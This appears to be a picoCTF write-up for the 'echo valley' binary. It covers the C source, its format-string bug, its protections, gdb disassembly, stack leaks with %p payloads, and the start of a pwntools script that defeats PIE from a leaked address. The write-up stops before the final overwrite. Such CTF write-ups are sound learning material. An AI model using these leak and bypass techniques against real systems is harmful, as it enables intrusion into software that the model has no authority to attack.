# picoCTF echo valley 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }

    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}

int main()
{
    echo_valley();
    return 0;
}
```

```bash
$ checksec --file=valley
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

> **Full RELRO** (Relocation Read-Only) is a security feature that makes the entire Global Offset Table (GOT) of an ELF binary read-only. This prevents attackers from overwriting function pointers in the GOT.
> **stack canary** is a security mechanism, a known value placed on the stack, that helps detect stack buffer overflows. When a buffer overflows, it corrupts the canary, and a check for its integrity triggers an error, preventing potentially malicious code from executing.
> **NX** short for No eXecute, is a security feature in modern CPUs that prevents memory regions from being executed as code.
> **PIE** stands for Position Independent Executable, which means that every time you run the file it gets loaded into a different memory address. This means you cannot hardcode values such as function addresses and gadget locations without finding out where they are.


## How to exploit?

#### vulnerability
```c
printf(buf);
```

Confirming if there even is a memory leak.
```bash
$ python3 -c "import sys;sys.stdout.buffer.write(b'%p '*5)" | ./valley

Welcome to the Echo Valley, Try Shouting:
You heard in the distance: 0x7ffe91b0eee0 (nil) (nil) (nil) (nil)
EOF detected. Exiting...
```

```
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000001401 <+0>:     endbr64
   0x0000000000001405 <+4>:     push   rbp
   0x0000000000001406 <+5>:     mov    rbp,rsp
   0x0000000000001409 <+8>:     mov    eax,0x0
   0x000000000000140e <+13>:    call   0x1307 <echo_valley>
   0x0000000000001413 <+18>:    mov    eax,0x0
   0x0000000000001418 <+23>:    pop    rbp
   0x0000000000001419 <+24>:    ret
End of assembler dump.

(gdb) disassemble echo_valley
Dump of assembler code for function echo_valley:
   0x0000000000001307 <+0>:     endbr64
   0x000000000000130b <+4>:     push   rbp
   0x000000000000130c <+5>:     mov    rbp,rsp
   0x000000000000130f <+8>:     sub    rsp,0x70
   0x0000000000001313 <+12>:    mov    rax,QWORD PTR fs:0x28
   0x000000000000131c <+21>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001320 <+25>:    xor    eax,eax
   0x0000000000001322 <+27>:    lea    rax,[rip+0xd37]        # 0x2060
   0x0000000000001329 <+34>:    mov    rdi,rax
   0x000000000000132c <+37>:    call   0x10e0 <puts@plt>
   0x0000000000001331 <+42>:    mov    rax,QWORD PTR [rip+0x2cd8]        # 0x4010 <stdout@GLIBC_2.2.5>
   0x0000000000001338 <+49>:    mov    rdi,rax
   0x000000000000133b <+52>:    call   0x1140 <fflush@plt>
   0x0000000000001340 <+57>:    mov    rdx,QWORD PTR [rip+0x2cd9]        # 0x4020 <stdin@GLIBC_2.2.5>
   0x0000000000001347 <+64>:    lea    rax,[rbp-0x70]
   0x000000000000134b <+68>:    mov    esi,0x64
   0x0000000000001350 <+73>:    mov    rdi,rax
   0x0000000000001353 <+76>:    call   0x1120 <fgets@plt>
   0x0000000000001358 <+81>:    test   rax,rax
   0x000000000000135b <+84>:    jne    0x1376 <echo_valley+111>
   0x000000000000135d <+86>:    lea    rax,[rip+0xd27]        # 0x208b
   0x0000000000001364 <+93>:    mov    rdi,rax
   0x0000000000001367 <+96>:    call   0x10e0 <puts@plt>
   0x000000000000136c <+101>:   mov    edi,0x0
   0x0000000000001371 <+106>:   call   0x1170 <exit@plt>
   0x0000000000001376 <+111>:   lea    rax,[rbp-0x70]
   0x000000000000137a <+115>:   lea    rdx,[rip+0xd24]        # 0x20a5
   0x0000000000001381 <+122>:   mov    rsi,rdx
   0x0000000000001384 <+125>:   mov    rdi,rax
   0x0000000000001387 <+128>:   call   0x1130 <strcmp@plt>
   0x000000000000138c <+133>:   test   eax,eax
   0x000000000000138e <+135>:   jne    0x13c1 <echo_valley+186>
   0x0000000000001390 <+137>:   lea    rax,[rip+0xd14]        # 0x20ab
   0x0000000000001397 <+144>:   mov    rdi,rax
   0x000000000000139a <+147>:   call   0x10e0 <puts@plt>
   0x000000000000139f <+152>:   nop
   0x00000000000013a0 <+153>:   mov    rax,QWORD PTR [rip+0x2c69]        # 0x4010 <stdout@GLIBC_2.2.5>
   0x00000000000013a7 <+160>:   mov    rdi,rax
   0x00000000000013aa <+163>:   call   0x1140 <fflush@plt>
   0x00000000000013af <+168>:   nop
   0x00000000000013b0 <+169>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00000000000013b4 <+173>:   sub    rax,QWORD PTR fs:0x28
   0x00000000000013bd <+182>:   je     0x13ff <echo_valley+248>
   0x00000000000013bf <+184>:   jmp    0x13fa <echo_valley+243>
   0x00000000000013c1 <+186>:   lea    rax,[rip+0xcf9]        # 0x20c1
   0x00000000000013c8 <+193>:   mov    rdi,rax
   0x00000000000013cb <+196>:   mov    eax,0x0
   0x00000000000013d0 <+201>:   call   0x1110 <printf@plt>
   0x00000000000013d5 <+206>:   lea    rax,[rbp-0x70]
   0x00000000000013d9 <+210>:   mov    rdi,rax
   0x00000000000013dc <+213>:   mov    eax,0x0
   0x00000000000013e1 <+218>:   call   0x1110 <printf@plt>
   0x00000000000013e6 <+223>:   mov    rax,QWORD PTR [rip+0x2c23]        # 0x4010 <stdout@GLIBC_2.2.5>
   0x00000000000013ed <+230>:   mov    rdi,rax
   0x00000000000013f0 <+233>:   call   0x1140 <fflush@plt>
   0x00000000000013f5 <+238>:   jmp    0x1331 <echo_valley+42>
   0x00000000000013fa <+243>:   call   0x1100 <__stack_chk_fail@plt>
   0x00000000000013ff <+248>:   leave
   0x0000000000001400 <+249>:   ret
End of assembler dump.
```

On leaking further stack addresses, we can see there are addresses of main and return address of echo_valley on 27th and 21st positions.
```bash
python3 -c "import sys;sys.stdout.buffer.write(b'%p '*30)" | ./valley

Welcome to the Echo Valley, Try Shouting:
You heard in the distance: 0x7ffdbc376a60 (nil) (nil) (nil) (nil)0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070 (nil) 0x785fbe89bb663600 0x7ffdbc376c90 0x560d5c42d413 0x7ffdbc376d30 0x7f38dd2131ca 0x7ffdbc376ce0 0x7ffdbc376db8 0x15c42c040 0x560d5c42d401 0x7ffdbc376db8 0x366e2f652cc532e5 0x1
EOF detected. Exiting...
```

using position specific specifiers to further confirm this.
```bash
python3 -c 'import sys;sys.stdout.buffer.write(b"%21$p %27$p")' | ./valley

Welcome to the Echo Valley, Try Shouting:
You heard in the distance: 0x55dbb33cf413 0x55dbb33cf401
EOF detected. Exiting...
```

Then we can use these addresses with [pwntools](https://docs.pwntools.com/en/stable/) provided address to calculate the offset which is added to binary due to PIE.

```python
from pwn import *

context.arch = "amd64"

elf = ELF("./valley")
p = process("./valley")

p.sendlineafter(b"Shout: ", b"%27$p")
main_addr = int(p.recv().decode("latin-1").split(":")[-1], 16)

offset = main_addr - elf.symbols["main"]

ret_addr = offset+0x1413
```
